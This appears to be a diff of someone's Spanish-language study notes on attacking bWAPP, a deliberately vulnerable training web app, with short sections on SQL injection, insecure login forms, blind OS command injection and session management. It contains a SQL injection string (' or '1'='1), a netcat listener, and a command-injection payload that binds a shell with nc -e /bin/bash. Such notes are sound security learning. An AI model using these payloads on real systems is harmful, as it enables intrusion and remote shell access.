@@ -39,7 +39,30 @@ ataque --> mandar a la victima la URL 'tuneada'
 sudo nc -vlp 8080
 
 
------- OS command injection 
+------  SQL Injection (Search/Get)
+- uso normal: introducir TÍTULO (blanco lista todas)
+' or '1'='1
+
+
+
+------   Broken Auth -Insecure Login Forms:
+No sabemos el usuario/password
+Pero podemos descubrirlo en el código fuente
+
+
+------  OS Command Injection -Blind
+Here we enter a os command to get a net cat session in the attacker machine.
+
+
+------  Session Mgmt. - Administrative Portals
+La página está bloqueada, pero mira en la URL XD
+
+
+
+
+
+
+------ OS command injection (no va)
 - uso normal: DNS Lookup de un dominio
 - Ataque 
  && nc -vlp 4444 -e /bin/bash
@@ -52,7 +75,7 @@ comprobar en un a consola
 
 ---- BURPSUITE --------------------
 https://writeups.kunull.net/bWAPP/
-
+https://infosecwriteups.com/bwapp-html-injection-reflected-url-5dacf7f6d942
 
 
 
